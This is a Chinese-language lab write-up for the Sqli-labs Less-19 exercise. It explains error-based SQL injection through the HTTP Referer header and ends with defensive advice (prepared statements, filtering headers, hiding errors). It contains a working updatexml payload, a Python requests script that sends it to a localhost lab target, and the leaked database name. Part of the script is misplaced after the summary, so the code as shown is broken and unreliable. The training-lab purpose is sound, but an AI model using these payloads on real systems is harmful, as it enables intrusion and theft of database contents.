## 题目: Sqli-labs Less-19

## 题目描述
本关页面和 Less-18 极其相似，输入正确的账号密码登录后，页面会显示 `Your IP ADDRESS is: ...`。
但本关的标题是 `Header Injection - Referer - Error based`。这说明后台不仅记录了你的 IP 和 User-Agent，还会将 HTTP 请求头中的 `Referer`（来源页面）字段写入数据库，并且存在报错注入漏洞。

## 解题思路
后台执行的 SQL 语句大概率是 `INSERT INTO referers (referer, ip_address) VALUES ('$referer', '$ip')`。
因为是在 HTTP 头部注入，和 18 关一样，行尾的空格和换行极易被丢弃，导致注释符 `#` 或 `--+` 失效。我们依然使用 **`or '`** 来补齐后面的单引号，实现无注释符的完美逃逸。

## 解题步骤
**1. 确认登录前置条件**
必须使用正确的账号密码登录成功（如 `admin/admin`），页面才会触发 `INSERT` 语句。

**2. 编写基于 Referer 的报错注入脚本**

**实战 Payload 核心代码**：

```python
import requests
import re

url = "http://127.0.0.1/sqli-labs/Less-19/"
data = {'uname': 'admin', 'passwd': 'admin', 'submit': 'Submit'}

# 完美逃逸 Payload
payload = "' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '"

# 核心：将 Payload 放入 Referer 头中
headers = {
    'Referer': payload
}

r = requests.post(url, data=data, headers=headers)

print("\n============== 寻找报错信息 ==============")
```
**3. 运行结果**
成功触发报错，爆出当前数据库名：
```text
XPATH syntax error: '~security~'
```

## 知识点总结
* Referer 注入：Referer 用于告诉服务器请求来源，很多系统会记录该字段，若未过滤直接拼接进 SQL，同样会导致注入。
* Header 注入的通用绕过：无论注入点在 User-Agent 还是 Referer，由于 HTTP 协议特性，末尾的空格和换行可能失效。使用 or ' 或 and 1=1 补齐闭合，是通杀 Header 注入的利器。
* 防御策略：使用 PDO 预编译；对所有用户可控的输入（包括 Header 头）进行严格过滤和转义；关闭数据库详细报错。
for line in r.text.split('\n'):
    if "XPATH" in line or "error" in line.lower():
        print(line.strip())
